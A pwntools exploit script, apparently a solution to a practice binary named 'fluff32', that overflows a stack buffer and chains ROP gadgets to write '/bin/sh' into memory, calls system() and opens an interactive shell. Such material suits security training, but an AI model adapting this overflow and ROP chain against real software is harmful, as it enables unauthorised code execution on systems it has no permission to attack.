#/usr/bin/env python

from pwn import *

context.binary = './fluff32'
#context.log_level = 'debug'

io = process('./fluff32')
elf = ELF('./fluff32')
'''
.text:08048670 questionableGadgets:
.text:08048670                 pop     edi
.text:08048671                 xor     edx, edx
.text:08048673                 pop     esi
.text:08048674                 mov     ebp, 0CAFEBABEh
.text:08048679                 retn
.text:0804867A;---------------------------------------------------------------------------
.text:0804867A                 pop     esi
.text:0804867B                 xor     edx, ebx
.text:0804867D                 pop     ebp
.text:0804867E                 mov     edi, 0DEADBABEh
.text:08048683                 retn
.text:08048684;---------------------------------------------------------------------------
.text:08048684                 mov     edi, 0DEADBEEFh
.text:08048689                 xchg    ecx, edx
.text:0804868B                 pop     ebp
.text:0804868C                 mov     edx, 0DEFACED0h
.text:08048691                 retn
.text:08048692;---------------------------------------------------------------------------
.text:08048692                 pop     edi
.text:08048693                 mov     [ecx], edx
.text:08048695                 pop     ebp
.text:08048696                 pop     ebx
.text:08048697                 xor     [ecx], bl
.text:08048699                 retn
'''

command = "/bin/sh\x00"
# for i in command:
# 	print hex(ord(i))

io.recv()
payload1 = 'A'*(0x28+4)
payload1 += p32(0x08048670) #xor edx,edx;ret
payload1 += p32(0)+p32(0)
payload1 += p32(0x080483e1) #pop rbx,ret;
payload1 += p32(0x804a068)
payload1 += p32(0x804867A) #xor edx,ebx;ret
payload1 += p32(0)+p32(0)
payload1 += p32(0x8048684) #xchg ecx,edx;ret
payload1 += p32(0)
payload1 += p32(0x8048670) #xor edx,edx;ret
payload1 += p32(0)+p32(0)
payload1 += p32(0x080483e1) # pop rbx,ret
payload1 += p32(0x6e69622f) # '/bin'
payload1 += p32(0x0804867A) #xor edx,ebx;ret
payload1 += p32(0)+p32(0)
payload1 += p32(0x8048692) #mov [ecx,edx];ret
payload1 += p32(0)+p32(0)+p32(0)
payload1 += p32(elf.symbols['pwnme'])
io.sendline(payload1)

io.recv()
payload2 = 'A'*(0x28+4)
payload2 += p32(0x08048670) #xor edx,edx;ret
payload2 += p32(0)+p32(0)
payload2 += p32(0x080483e1) #pop rbx,ret;
payload2 += p32(0x804a06c)
payload2 += p32(0x804867A) #xor edx,ebx;ret
payload2 += p32(0)+p32(0)
payload2 += p32(0x8048684) #xchg ecx,edx;ret
payload2 += p32(0)
payload2 += p32(0x8048670) #xor edx,edx;ret
payload2 += p32(0)+p32(0)
payload2 += p32(0x080483e1) # pop rbx,ret
payload2 += p32(0x68732f) # '/sh\x00'
payload2 += p32(0x0804867A) #xor edx,ebx;ret
payload2 += p32(0)+p32(0)
payload2 += p32(0x8048692) #mov [ecx,edx];ret
payload2 += p32(0)+p32(0)+p32(0)
payload2 += p32(elf.symbols['pwnme'])
io.sendline(payload2)

io.recv()
payload3 = 'A'*(0x28+0x4)
payload3 += p32(elf.plt['system'])
payload3 += 'A'*4
payload3 += p32(0x804A068)
io.sendline(payload3)

io.interactive()